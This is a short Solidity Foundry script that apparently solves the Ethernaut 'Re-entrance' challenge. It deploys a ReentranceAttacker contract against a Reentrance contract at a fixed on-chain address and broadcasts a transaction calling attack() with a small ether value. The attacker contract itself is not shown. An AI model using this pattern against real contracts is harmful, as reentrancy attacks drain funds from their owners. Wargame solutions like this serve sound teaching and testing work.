// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "../src/Reentrance.sol";
import {ReentranceAttacker} from "../src/ReentranceAttacker.sol";
import {Script} from "forge-std/Script.sol";

contract ReentranceScript is Script {
    Reentrance target;
    ReentranceAttacker attacker;
    
    function run() public {
        target = Reentrance(0xBec870604084884Ef6a97A2dDaB735c798ddaa51);
        vm.startBroadcast();
        attacker = new ReentranceAttacker(address(target));

        attacker.attack{value: 1e15}();

        vm.stopBroadcast();

    }
}
